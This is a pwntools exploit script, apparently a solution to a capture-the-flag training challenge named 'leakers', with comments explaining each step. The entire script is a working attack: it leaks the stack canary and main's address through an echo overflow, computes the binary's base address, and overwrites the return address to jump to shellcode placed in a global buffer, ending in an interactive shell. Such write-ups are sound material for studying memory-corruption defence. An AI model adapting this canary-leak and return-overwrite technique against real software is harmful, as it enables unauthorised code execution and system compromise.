from pwn import *

# echo-like prog which asks for a name and then starts asking for strings and echoing them, no limit on the number of echoed strings

EXE = "./leakers"
CHALL = ELF(EXE, checksec = False)
COMMANDS = """
brva 0x12F9
c
"""
context.arch = "amd64"

if args.REMOTE:
    c = remote("leakers.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug(EXE, gdbscript = COMMANDS)
    else:
        c = process(EXE)

# string name will contain the shellcode
name = asm(shellcraft.sh())
c.recvuntil(b"name?\n")
c.sendline(name)

# leaking the canary (overwriting the last byte, which is \0)
payload = b'A' * (0x78-0x10 + 1)    # +1 is for the last byte
c.recvuntil(b"Echo: ")
c.send(payload)

c.recvuntil(payload)
canary = u64(b"\x00" + c.recv(7))
print("Canary: " + hex(canary))

# leaking the main addr (saved on stack because of low security)
payload = b'A' * (0x78-0x10 + 6*8)  # 6*8 are 4 bytes of canary + 2 empty main addr bytes
c.recvuntil(b"Echo: ")
c.send(payload)

c.recvuntil(payload)
leak = c.recv(6).ljust(8, b"\x00")  # adding again the two empty bytes to the ret addr
print("main() address: " + hex(u64(leak)))

CHALL.address = u64(leak) - CHALL.symbols["main"]   # getting prog start addr by subtracting main offset to real main addr
print("ELF base: ", hex(CHALL.address))
print("ps1 @ ", hex(CHALL.symbols["ps1"]))          # ps1 is an array

# making the program execute the shellcode
payload = b"A" * (0x68)                 # just before the canary address
payload += p64(canary)                  # rewriting the canary
payload += p64(0)                       # srbp can contain any value
payload += p64(CHALL.symbols["ps1"])    # return to the shellcode

c.recvuntil(b"Echo: ")
c.send(payload)
c.recvuntil("Echo: ")
c.sendline()            # to make the main return, triggering the exploit
c.interactive()